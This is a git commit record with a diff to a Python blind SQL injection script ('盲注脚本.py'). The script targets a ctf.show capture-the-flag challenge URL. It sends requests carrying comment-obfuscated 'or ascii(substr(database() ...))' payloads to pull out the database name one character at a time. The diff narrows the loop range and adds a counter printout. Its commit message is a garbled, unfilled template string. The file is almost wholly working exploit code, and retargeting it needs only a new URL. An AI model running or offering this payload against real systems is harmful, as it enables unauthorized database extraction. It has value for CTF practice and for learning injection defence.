f46d65b0462da6e2078a45ef8907924366a25cd4
whb54012 <1226844928@qq.com>
2026-07-21 11:16:13 +0000

    自动提交：更新 ${2026/7/21 19:16ilenPM16e}

--- python/盲注脚本.py
+++ python/盲注脚本.py
@@ -1,7 +1,8 @@
 import requests
 word=""
+num=0
 url = "http://b14e78f6-4073-4fa1-ad67-8d5d1ed1deab.challenge.ctf.show/index.php?id=/**/or/**/"
-for num1 in range(1,20):
+for num1 in range(1,8):
     for num2 in range (65,123):
         data = "ascii(substr(database() from %d for 1))=%d" % (num1, num2)
         result = requests.get(url + data,verify=False,timeout=1)
@@ -10,5 +11,6 @@ for num1 in range(1,20):
             print(word)
             break
         else:
-            pass
+            print(num)
+            num+=1
 
